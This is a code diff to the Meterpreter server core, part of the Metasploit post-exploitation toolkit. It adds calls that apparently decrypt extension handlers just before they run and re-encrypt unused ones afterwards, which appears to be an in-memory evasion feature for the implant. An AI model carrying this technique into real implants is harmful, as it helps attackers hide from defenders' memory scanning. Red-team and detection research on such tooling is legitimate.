@@ -3,6 +3,7 @@
  * @brief Definitions that apply to almost any Meterpreter component.
  */
 #include "metsrv.h"
+#include "extension_encryption.h"
 
 // TODO: move these to a header?
 // Local remote request implementors
@@ -286,6 +287,8 @@ BOOL command_process_inline(Command *command, Remote *remote, Packet *packet)
 	PacketTlvType packetTlvType;
 	UINT commandId = 0;
 
+	DWORD extensionFindDecryptVal = ERROR_SUCCESS;
+
 	__try
 	{
 		do
@@ -318,12 +321,30 @@ BOOL command_process_inline(Command *command, Remote *remote, Packet *packet)
 			case PACKET_TLV_TYPE_PLAIN_REQUEST:
 				if (command->request.inline_handler) {
 					dprintf("[DISPATCH] executing inline request handler %u", commandId);
+					dprintf("[DISPATCH] Calling extensionFindDecrypt for command %u", commandId);
+					extensionFindDecryptVal = extensionFindDecrypt(command->request.inline_handler);
+					if (!extensionFindDecryptVal || extensionFindDecryptVal == EXTENSION_ENCRYPTION_EXTENSION_NOT_ENCRYPTABLE) {
+						dprintf("[COMMAND] Decryption successful for command %u", commandId);
+					}
+					else {
+						dprintf("[COMMAND] Decryption failed for command %u", commandId);
+						//break;
+					}
 					serverContinue = command->request.inline_handler(remote, packet, &result) && serverContinue;
 					dprintf("[DISPATCH] executed %u, continue %s", commandId, serverContinue ? "yes" : "no");
 				}
 				else
 				{
 					dprintf("[DISPATCH] executing request handler %u", commandId);
+					dprintf("[DISPATCH] Calling extensionFindDecrypt for command %u", commandId);
+					extensionFindDecryptVal = extensionFindDecrypt(command->request.handler);
+					if (!extensionFindDecryptVal || extensionFindDecryptVal == EXTENSION_ENCRYPTION_EXTENSION_NOT_ENCRYPTABLE) {
+						dprintf("[COMMAND] Decryption successful for command %u", commandId);
+					}
+					else {
+						dprintf("[COMMAND] Decryption failed for command %u", commandId);
+						//break;
+					}
 					result = command->request.handler(remote, packet);
 				}
 				break;
@@ -332,11 +353,29 @@ BOOL command_process_inline(Command *command, Remote *remote, Packet *packet)
 				if (command->response.inline_handler)
 				{
 					dprintf("[DISPATCH] executing inline response handler %u", commandId);
+					dprintf("[DISPATCH] Calling extensionFindDecrypt for command %u", commandId);
+					extensionFindDecryptVal = extensionFindDecrypt(command->response.inline_handler);
+					if (!extensionFindDecryptVal || extensionFindDecryptVal == EXTENSION_ENCRYPTION_EXTENSION_NOT_ENCRYPTABLE) {
+						dprintf("[COMMAND] Decryption successful for command %u", commandId);
+					}
+					else {
+						dprintf("[COMMAND] Decryption failed for command %u", commandId);
+						//break;
+					}
 					serverContinue = command->response.inline_handler(remote, packet, &result) && serverContinue;
 				}
 				else
 				{
 					dprintf("[DISPATCH] executing response handler %u", commandId);
+					dprintf("[DISPATCH] Calling extensionFindDecrypt for command %u", commandId);
+					extensionFindDecryptVal = extensionFindDecrypt(command->response.handler);
+					if (!extensionFindDecryptVal || extensionFindDecryptVal == EXTENSION_ENCRYPTION_EXTENSION_NOT_ENCRYPTABLE) {
+						dprintf("[COMMAND] Decryption successful for command %u", commandId);
+					}
+					else {
+						dprintf("[COMMAND] Decryption failed for command %u", commandId);
+						//break;
+					}
 					result = command->response.handler(remote, packet);
 				}
 				break;
@@ -455,6 +494,7 @@ BOOL command_handle(Remote *remote, Packet *packet)
 			break;
 		}
 
+
 		// if either command is registered as inline, run them inline
 		if ((command && command_is_inline(command, packet))
 			|| packet->local)
@@ -474,8 +514,9 @@ BOOL command_handle(Remote *remote, Packet *packet)
 				thread_run(cpt);
 			}
 		}
-	} while (0);
 
+	} while (0);
+	extension_encryption_encrypt_unused();
 	return result;
 }
 
